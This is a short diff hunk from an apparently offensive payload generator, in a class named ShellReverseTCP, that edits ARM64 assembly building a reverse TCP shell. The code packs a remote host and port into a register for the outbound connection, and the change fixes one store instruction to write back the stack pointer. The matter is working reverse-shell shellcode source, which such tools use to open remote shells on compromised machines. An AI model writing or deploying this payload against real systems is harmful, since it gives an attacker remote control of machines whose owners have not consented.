@@ -57,7 +57,7 @@ class ShellReverseTCP(HatAsm, HatVenom, Words):
             movk x1, 0x{rport.hex()}, lsl 0x10
             movk x1, 0x{rhost[2:].hex()}, lsl 0x20
             movk x1, 0x{rhost[:2].hex()}, lsl 0x30
-            str x1, [sp, -8]
+            str x1, [sp, -8]!
             add x1, sp, x2
             mov x2, 0x10
             mov x8, 0xcb
